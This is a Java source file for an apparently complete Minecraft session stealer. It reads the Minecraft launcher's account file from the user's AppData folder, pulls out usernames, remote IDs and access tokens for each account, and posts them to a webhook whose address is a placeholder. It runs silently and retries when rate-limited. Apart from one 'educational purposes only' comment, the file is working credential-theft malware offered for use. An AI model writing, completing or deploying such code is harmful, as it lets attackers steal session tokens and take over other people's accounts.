package main.java.com.github.Kami147.MinecraftSessionStealer;

import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;

import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;

public class Main {

	// Educational purposes only

	private static String webhook = "UR WEBHOOK HERE";

	private static boolean debug = false;

	public static void main(String[] args) {
		
		String appdataLocation = System.getenv("APPDATA");
		String minecraftLocation = appdataLocation + "\\.minecraft\\";
		
		if (debug) System.out.println(minecraftLocation);
		
		File launcherAccounts = new File(minecraftLocation+"launcher_accounts.json");
		
		if(launcherAccounts.exists()) {
			try {
				Object reader = new JSONParser().parse(new FileReader(launcherAccounts)); 
				JSONObject jo = (JSONObject) reader; 
				Map accounts = ((Map)jo.get("accounts")); 
				
				if(debug) System.out.println("Amount: "+accounts.size());
				
			    Iterator<Map.Entry> accountIterator = accounts.entrySet().iterator(); 
			    while (accountIterator.hasNext()) { 
			    	Map.Entry info = accountIterator.next(); 
					StringBuilder finalData = new StringBuilder();
					finalData.append("```\\n");
			    	finalData.append(info.getKey()+"\\n\\n");
			    	String[] inner = info.getValue().toString().replace(",", "\n").replace("\"", "").replace("{", "\n").replace("}", "\n").split("\n");
			    	for(String newPart : inner) {
			    		if(newPart.contains("username"))
			    			finalData.append(newPart.replace(":", " - ")+"\\n\\n");
			    		if(newPart.contains("remoteId"))
			    			finalData.append(newPart.replace(":", " - ")+"\\n\\n");
			    		if(newPart.contains("accessToken"))
			    			finalData.append(newPart.replace(":", " - ")+"\\n\\n");
			    	}
				    finalData.append("```");
				    //if(debug) System.out.println(finalData);
				    sendData(finalData.toString());
			    }
					    
			}catch(Exception e) {
				if(debug) e.printStackTrace();
			}
		}else {
			if(debug) System.out.println("Failed To Read: launcher_accounts.json");
		}
		
		try {
			sendData("");
		} catch (IOException e) {
			if(debug) e.printStackTrace();
		}
	}

	private static void sendData(String toSend) throws IOException {
		URL obj = new URL(webhook);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("POST");
		con.setRequestProperty("Content-Type", "application/json");
		con.setRequestProperty("User-Agent", "Mozilla/5.0");

		String POST_PARAMS = "{ \"username\": \"Kami147\", \"avatar_url\": \"https://avatars0.githubusercontent.com/u/57001729?s=460&u=b9554da9dbc53de926894e1ec13788ef58d7a614&v=4\", \"content\": \""
				+ toSend + "\" }";

		//if(debug) System.out.println(POST_PARAMS);
		
		con.setDoOutput(true);
		OutputStream os = con.getOutputStream();
		os.write(POST_PARAMS.getBytes());
		os.flush();
		os.close();

		int resp = con.getResponseCode();
		if(debug) System.out.println(resp);
		
		if(resp==429) {
			try {
				Thread.sleep(5000);
				sendData(toSend);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
	}

}
